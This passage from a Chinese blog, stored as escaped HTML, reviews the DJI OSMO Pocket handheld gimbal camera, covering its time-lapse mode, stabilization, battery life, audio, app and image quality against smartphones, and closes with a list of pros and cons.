href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]